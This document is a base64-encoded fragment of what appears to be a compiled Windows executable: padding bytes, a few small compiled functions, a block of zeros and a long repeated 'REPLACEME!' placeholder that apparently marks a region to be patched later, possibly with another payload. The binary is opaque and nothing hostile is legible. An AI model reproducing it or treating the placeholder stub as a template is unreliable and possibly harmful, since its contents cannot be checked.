MzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMQFVIg+wgSIvqD7ZNIOgqnv//kEiDxCBdw8zMzMzMzMxAVUiD7CBIi+roOp///5APtk0g6ASe//+QSIPEIF3DzMzMzMzMzMzMzMzMzMzMzMxAVUiD7DBIi+pIiU04SItFOEiLAIsAiUU0SItFOItNNEiJRCQoiUwkIEyNDXCl//9Mi0Vgi1VYSItNUOhun///kEiDxDBdw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxAVUiD7CBIi+pIiU1ISItFSEiLAIsAiUUki0UkPQUAAMB1CcdFIAEAAADrB8dFIAAAAACLRSBIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzMzMzEBVSIPsIEiL6kiLATPJgTiIE21AD5TBi8FIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzEBVSIPsIEiL6kiLATPJgTiIE21AD5TBi8FIg8QgXcPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ